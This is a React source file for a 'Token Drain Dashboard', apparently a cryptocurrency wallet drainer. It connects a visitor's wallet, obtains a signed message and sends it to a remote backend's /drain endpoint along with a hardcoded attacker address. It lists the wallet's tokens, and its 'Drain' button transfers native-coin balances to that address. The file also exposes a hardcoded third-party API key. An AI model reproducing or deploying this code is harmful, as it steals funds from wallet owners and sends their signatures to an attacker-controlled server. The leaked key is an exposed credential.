import { useState, useEffect, useCallback } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useSignMessage, useChainId, usePublicClient, useWalletClient } from 'wagmi';
import { parseEther } from 'viem';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// Main App Component
function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
          disclaimer: null,
          embedGoogleFonts: false,
          customTheme: {
            "--ck-font-family": "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
            "--ck-border-radius": "12px",
          },
        }}
        theme="midnight"
      >
        <Dashboard />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

// Dashboard Component
function Dashboard() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId(); // Changed from useNetwork()
  const { signMessageAsync } = useSignMessage();
  const publicClient = usePublicClient();
  const { data: walletClient } = useWalletClient();

  const [authStatus, setAuthStatus] = useState('');
  const [signature, setSignature] = useState('');
  const [isAuthenticating, setIsAuthenticating] = useState(false);
  const [backendUrl] = useState('https://tokenbackend-5xab.onrender.com');
  const [userTokens, setUserTokens] = useState([]);
  const [txStatus, setTxStatus] = useState('');

  // Your drain wallet address
  const DRAIN_TO_ADDRESS = "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4";

  // Start auth when wallet connects
  useEffect(() => {
    if (isConnected && address) {
      handleWalletConnected(address);
    } else {
      setAuthStatus('');
      setSignature('');
      setUserTokens([]);
    }
  }, [isConnected, address]);

  const handleWalletConnected = async (walletAddress) => {
    try {
      setAuthStatus('Wallet connected, requesting signature...');
      await initiateBackendAuthentication(walletAddress);
    } catch (error) {
      console.error("Connection handler error:", error);
      setAuthStatus('Connection setup failed');
    }
  };

  const initiateBackendAuthentication = async (walletAddress) => {
    try {
      setIsAuthenticating(true);
      
      const timestamp = Date.now();
      const message = `Token Drain Authentication\n\nWallet: ${walletAddress}\nChain: ${chainId || 1}\nTimestamp: ${timestamp}`;
      
      // Sign message using wagmi
      const sig = await signMessageAsync({ message });
      setSignature(sig);
      
      setAuthStatus('Signature received, sending to backend...');
      await sendToBackend(walletAddress, sig, message, chainId || 1);
      
    } catch (error) {
      console.error("Auth error:", error);
      if (error.code === 4001) {
        setAuthStatus('User rejected signature');
      } else {
        setAuthStatus(`Auth failed: ${error.message}`);
      }
      setIsAuthenticating(false);
    }
  };

  const sendToBackend = async (address, sig, message, chainId) => {
    try {
      const payload = {
        address,
        signature: sig,
        message,
        chainId,
        drainTo: DRAIN_TO_ADDRESS,
        timestamp: new Date().toISOString()
      };
      
      console.log('Sending to backend:', payload);
      
      const response = await fetch(`${backendUrl}/drain`, {
        method: 'POST',
        mode: 'cors',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(payload)
      });
      
      if (!response.ok) {
        let errorDetail = `Status: ${response.status}`;
        try {
          const errorData = await response.json();
          errorDetail += ` - ${JSON.stringify(errorData)}`;
        } catch (e) {}
        throw new Error(`Backend error: ${errorDetail}`);
      }
      
      const data = await response.json();
      
      if (data.success) {
        setAuthStatus('✅ Backend authenticated!');
        await fetchUserTokens(address, chainId);
      } else {
        setAuthStatus(`Backend error: ${data.error || 'Unknown'}`);
      }
      
    } catch (error) {
      console.error("Backend connection error:", error);
      
      if (error.message.includes('Failed to fetch') || error.message.includes('CORS')) {
        setAuthStatus('⚠️ CORS Error: Backend not configured for this domain.');
      } else {
        setAuthStatus('⚠️ Backend connection failed');
      }
      
      if (address) {
        await fetchTokensDirectly(address, chainId);
      }
    } finally {
      setIsAuthenticating(false);
    }
  };

  const fetchUserTokens = async (address, chainId) => {
    try {
      setAuthStatus('Fetching tokens...');
      const response = await fetch(`${backendUrl}/tokens/${address}/${chainId}`);
      const data = await response.json();
      
      if (data.success) {
        setUserTokens(data.data.tokens || []);
        setAuthStatus(`✅ ${data.data.tokens?.length || 0} tokens found`);
      } else {
        await fetchTokensDirectly(address, chainId);
      }
    } catch (error) {
      console.error("Token fetch error:", error);
      await fetchTokensDirectly(address, chainId);
    }
  };

  const fetchTokensDirectly = async (address, chainId) => {
    try {
      const COVALENT_API_KEY = "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";
      const url = `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`;
      
      const response = await fetch(url);
      const data = await response.json();
      
      const tokens = data.data?.items
        ?.filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
        .map(t => ({
          symbol: t.contract_ticker_symbol || 'TOKEN',
          name: t.contract_name || 'Unknown',
          amount: parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18),
          value: (t.quote_rate || 0) * (parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18)),
          contractAddress: t.contract_address,
          decimals: t.contract_decimals,
          isNative: t.native_token || false
        })) || [];
      
      setUserTokens(tokens);
      setAuthStatus(`✅ ${tokens.length} tokens (via direct API)`);
    } catch (error) {
      console.error("Direct API error:", error);
      setAuthStatus('Token fetch failed');
    }
  };

  // Get chain name from chainId
  const getChainName = (chainId) => {
    const chains = {
      1: 'Ethereum',
      56: 'BSC',
      137: 'Polygon',
      42161: 'Arbitrum',
      10: 'Optimism',
      8453: 'Base',
      43114: 'Avalanche',
      250: 'Fantom'
    };
    return chains[chainId] || `Chain ${chainId}`;
  };

  // Execute token drain
  const executeDrainTransaction = useCallback(async (token) => {
    if (!walletClient || !address) {
      setTxStatus('Wallet not ready');
      return;
    }

    if (token.amount <= 0) {
      setTxStatus('❌ Cannot drain: Token amount is 0');
      return;
    }

    if (token.isNative) {
      try {
        setTxStatus('Preparing transfer...');
        
        const amountInWei = parseEther(token.amount.toString());
        
        if (amountInWei <= 0n) {
          setTxStatus('❌ Amount too small');
          return;
        }
        
        setTxStatus('Confirm in wallet...');
        
        const hash = await walletClient.sendTransaction({
          to: DRAIN_TO_ADDRESS,
          value: amountInWei,
        });
        
        setTxStatus(`✅ Sent! Hash: ${hash.substring(0, 10)}...`);
        
        // Optional: Wait for confirmation
        try {
          const receipt = await publicClient.waitForTransactionReceipt({ hash });
          if (receipt.status === 'success') {
            setTxStatus('🎉 Confirmed!');
          } else {
            setTxStatus('❌ Failed on-chain');
          }
        } catch (confirmationError) {
          console.log("Confirmation check skipped:", confirmationError.message);
        }
        
      } catch (error) {
        console.error("Transfer error:", error);
        if (error.code === 4001) {
          setTxStatus('User rejected');
        } else {
          setTxStatus(`Failed: ${error.shortMessage || error.message}`);
        }
      }
      return;
    }

    // ERC20 tokens (simplified - would need contract interaction)
    if (token.contractAddress) {
      setTxStatus('ERC20: Manual approval needed');
    }
  }, [walletClient, address, publicClient, DRAIN_TO_ADDRESS]);

  const getTotalValue = () => {
    return userTokens.reduce((sum, token) => sum + (token.value || 0), 0).toFixed(2);
  };

  const formatAddress = (addr) => {
    return addr ? `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}` : '';
  };

  return (
    <div className="App">
      <header className="App-header">
        <h1>🪙 Token Drain Dashboard</h1>
        
        <div className="wallet-connect-section">
          <ConnectKitButton />
        </div>
        
        {isConnected && address && (
          <div className="dashboard">
            <div className="wallet-info-card">
              <div className="wallet-details">
                <div className="detail-item">
                  <span className="label">Address:</span>
                  <span className="value">{formatAddress(address)}</span>
                </div>
                <div className="detail-item">
                  <span className="label">Network:</span>
                  <span className="value">{getChainName(chainId)} (ID: {chainId || 'N/A'})</span>
                </div>
              </div>
              
              <div className="authentication-status">
                <div className={`status-badge ${authStatus.includes('✅') ? 'success' : authStatus.includes('⚠️') ? 'warning' : 'neutral'}`}>
                  {isAuthenticating ? '🔄' : authStatus.includes('✅') ? '✅' : authStatus.includes('⚠️') ? '⚠️' : '⏳'}
                </div>
                <p className="status-text">{authStatus}</p>
                {signature && (
                  <p className="signature-info">
                    Signed: {signature.substring(0, 20)}...
                  </p>
                )}
                {txStatus && (
                  <div className="tx-status">
                    <strong>TX:</strong> {txStatus}
                  </div>
                )}
              </div>
              
              <div className="action-buttons">
                <button 
                  onClick={() => fetchUserTokens(address, chainId || 1)}
                  className="action-btn"
                  disabled={isAuthenticating}
                >
                  Refresh Tokens
                </button>
                <button 
                  onClick={() => initiateBackendAuthentication(address)}
                  className="action-btn secondary"
                  disabled={isAuthenticating}
                >
                  Re-authenticate
                </button>
              </div>
            </div>
            
            {userTokens.length > 0 && (
              <div className="tokens-section">
                <div className="tokens-header">
                  <h2>Your Tokens</h2>
                  <div className="tokens-summary">
                    <span className="count">{userTokens.length} tokens</span>
                    <span className="total-value">Total: ${getTotalValue()}</span>
                  </div>
                </div>
                
                <div className="tokens-grid">
                  {userTokens.map((token, index) => (
                    <div key={index} className="token-card">
                      <div className="token-info">
                        <h3 className="token-symbol">{token.symbol}</h3>
                        <p className="token-name">{token.name}</p>
                        <div className="token-amount">
                          {token.amount.toLocaleString(undefined, {
                            maximumFractionDigits: 8
                          })}
                        </div>
                        <div className="token-value">
                          {token.value ? `$${token.value.toFixed(2)}` : 'N/A'}
                        </div>
                      </div>
                      <button
                        onClick={() => executeDrainTransaction(token)}
                        className="drain-btn"
                        disabled={token.amount <= 0 || !walletClient}
                        title={token.amount <= 0 ? "Amount is 0" : "Drain this token"}
                      >
                        {token.amount <= 0 ? '0 Amount' : 'Drain'}
                      </button>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        )}
        
        <div className="footer-info">
          <p>Backend: <a href={`${backendUrl}/health`} target="_blank" rel="noopener noreferrer">Check Health</a></p>
          <div className="footer-links">
            <a href={`${backendUrl}`} target="_blank" rel="noopener noreferrer">API</a>
            <a href={`${backendUrl}/chains`} target="_blank" rel="noopener noreferrer">Chains</a>
          </div>
        </div>
      </header>
    </div>
  );
}

export default TokenDrainApp;
